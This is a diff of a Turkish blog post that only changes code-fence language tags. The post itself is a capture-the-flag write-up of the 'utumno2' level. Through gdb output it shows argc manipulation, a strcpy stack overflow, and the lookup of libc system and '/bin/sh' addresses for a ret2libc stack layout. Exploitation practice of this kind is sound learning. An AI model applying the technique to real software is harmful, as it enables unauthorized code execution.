@@ -16,7 +16,7 @@ background: '/img/posts/bg.png'
 
 Programı çalıştırdığımızda "Aw.." çıktısı veriyor. Argümanla çalıştırınca da durum değişmiyor. **ltrace** ve **strace**'te bize işe yarar bir bilgi sağlamıyor. O zaman **gdb** ile devam edelim.
 
-```asm
+```
    0x08048451 <+6>:	cmp    DWORD PTR [ebp+0x8],0x0
    0x08048455 <+10>:	je     0x804846b <main+32>
    0x08048457 <+12>:	push   0x8048510
@@ -28,14 +28,14 @@ Programı çalıştırdığımızda "Aw.." çıktısı veriyor. Argümanla çal�
 
 "Aw.." çıktısını main fonksiyonunun hemen başındaki **puts** fonksiyonu mu veriyor kontrol edelim.
 
-```asm
+```
 (gdb) x/s 0x8048510
 0x8048510:	"Aw.."
 ```
 
 Demek ki program öncelikle **ebp+0x8** adresindeki değer 0 mı diye bakıyor, değilse çıkıyor. Breakpoint koyarak bu adreste ne tutuluyormuş bir bakalım.
 
-```asm
+```
 (gdb) break *0x08048451
 Breakpoint 1 at 0x8048451: file utumno2.c, line 23.
 (gdb) r
@@ -49,7 +49,7 @@ Breakpoint 1, main (argc=1, argv=0xffffd654) at utumno2.c:23
 
 1 değeri tutuluyor. Bu değer argüman sayımız olabilir. Bir argüman vererek sayıyı bir daha kontrol edelim.
 
-```asm
+```
 (gdb) r asd
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -67,7 +67,7 @@ Programın devam edebilmesi için argüman sayısını 0 yapmamız lazım. Şimd
 
 Prohgramın çıkış yaptığı satırdan itibaren breakpoint koyarak devam ediyoruz.
 
-```asm
+```
 break *0x0804846b
 r
 set {int}0xffffd5c0=0
@@ -76,7 +76,7 @@ c
 
 **ebp+0x8**'ın tuttuğu adresin değerini 0 yaparak program akışını değiştiriyoruz ve devam ediyoruz.
 
-```asm
+```
 (gdb) ni
 0x0804846e	29	in utumno2.c
 (gdb) i r eax
@@ -89,7 +89,7 @@ eax            0xffffd654	-10668
 
 Program öncelikle **eax**'e birinci argümanın adresini atıyor. Bu argümandan sonraki stringlere de bakalım.
 
-```asm
+```
 (gdb) x/24s 0xffffd7a9
 0xffffd7a9:	"/utumno/utumno2"
 0xffffd7b9:	"asd"
@@ -121,7 +121,7 @@ Gördüğümüz üzere argümanların sonrasında çevre değişkenleri geliyor.
 Gördüğümüz gibi öncelikle program adı, sonra "asd" argümanı, sonra argümanların bittiğini göstermek için 0'lar, sonrasında da çevre değişkenleri. Bir sonrakiş adım **eax**'e 0x28 yani 40 eklemek olacak. Yani **eax**'in değeri **0xffffde18** olmalı.
 Devam edip bakalım.
 
-```asm
+```
 (gdb) ni
 (gdb) ni
 (gdb) i r eax
@@ -134,7 +134,7 @@ Bir adreste 4 byte tutuluyor ve **eax**'in üzerine 40 byte ekleniyor. Yani biz 
 
 **strcpy** fonksiyonu **buffer overflow**'a açık bir fonksiyondur. Bundan ötürü kaç karakterden sonra **overflow** olacağını anlamak için **leave** satırına breakpoint koyup stack'imizin durumuna bakalım.
 
-```asm
+```
 (gdb) x/12wx $esp
 0xffffd5ac:	0x474e414c	0x5f6e653d	0x552e5355	0x382d4654
 0xffffd5bc:	0xf7e2a200	0x00000000	0xffffd654	0xffffd660
@@ -185,14 +185,14 @@ gcc -m32 code.c
 
 **system** fonksiyonun yeri için **print &system** dememiz yetiyor.
 
-```asm
+```
 (gdb) print &system
 $1 = (<text variable, no debug info> *) 0xf7e4c850 <system>
 ```
 
 Şimdi de **/bin/sh** stringinin yerini bulmak için C library'sinin belleğin neresine yüklendiğine bakalım.
 
-```asm
+```
 (gdb) info proc mappings
 process 30783
 Mapped address spaces:
@@ -216,7 +216,7 @@ Demek ki **/bin/sh** belleğin **0xf7e12000 + 0x15ccc8 = 0xf7f6ecc8** adresinde 
 
 **system** fonksiyonunu kullanmamız için parametreleri şu şekilde stack'e yerleştirmemiz gerekiyor. 
 
-```asm
+```
 Programın döneceği adresten itibaren:
 <SYSTEM FONKSİIYONUNUN ADRESİ> <SYSTEM FONKSİYONUNUN DÖNECEĞİ ADRES> <SYSTEM FONKSİYONUNUN ÇALIŞTIRACAĞI KOMUT STRİNGİ>
 ```
